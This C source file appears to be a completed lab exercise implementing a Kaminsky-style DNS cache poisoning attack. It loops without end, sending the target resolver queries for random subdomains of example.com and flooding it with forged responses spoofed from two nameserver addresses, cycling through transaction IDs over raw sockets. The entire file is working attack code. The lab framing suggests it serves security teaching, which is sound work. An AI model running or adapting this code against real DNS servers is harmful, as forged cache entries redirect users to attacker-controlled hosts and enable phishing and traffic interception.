#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000


/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request(char *ip_req, int n_req, char *name, unsigned short transaction_id);
void send_dns_response(char *ip_resp, int n_resp, char *name, unsigned short transaction_id, unsigned int src_ip);

int main()
{
  long i = 0;

  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
     perror("Can't open 'ip_req.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26]="abcdefghijklmnopqrstuvwxyz";
  while (1) {
    // Generate a random name with length 5
    char name[5];
    for (int k=0; k<5; k++)  name[k] = a[rand() % 26];

  //##################################################################
  /* Step 1. Send a DNS request to the targeted local DNS server
            This will trigger it to send out DNS queries */
  send_dns_request(ip_req, n_req, name, 0);

  for (int x = 0; x < 500; x++) {
    // Generate a random 2-byte transaction ID (0xFFFF is 65535, so there are max 65536 values for transaction_id)
    // Step 2. Send spoofed responses to the targeted local DNS server.
    printf("attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\n", 
            ++i, name, x);

    unsigned int ns1 = 0x35872bc7;  // 199.43.135.53
    unsigned int ns2 = 0x35852bc7;  // 199.43.133.53

    // Send fake DNS reply "from" both nameservers
    send_dns_response(ip_resp, n_resp, name, x, ns1);
    send_dns_response(ip_resp, n_resp, name, x, ns2);
  }


  //##################################################################
  }
}


/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request(char *ip_req, int n_req, char *name, unsigned short transaction_id)
{
  // Modify name in the question field
  memcpy(ip_req+41, name, 5);

  // Modify transaction ID field
  unsigned short id_net_order = htons(transaction_id);
  memcpy(ip_req+28, &id_net_order, 2);

  // Send modifed request packet
  send_raw_packet(ip_req, n_req);
}


/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */
void send_dns_response(char *ip_resp, int n_resp, char *name, unsigned short transaction_id, unsigned int src_ip)
{
  // Modify src IP address
  memcpy(ip_resp+12, &src_ip, 4);

  // Modify name in question field
  memcpy(ip_resp+41, name, 5);

  // Modify name in answer field
  memcpy(ip_resp+64, name, 5);

  // Modify transaction ID field
  unsigned short id_net_order = htons(transaction_id);
  memcpy(ip_resp+28, &id_net_order, 2);


  // Send modified response packet with ns1
  send_raw_packet(ip_resp, n_resp);
}


/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
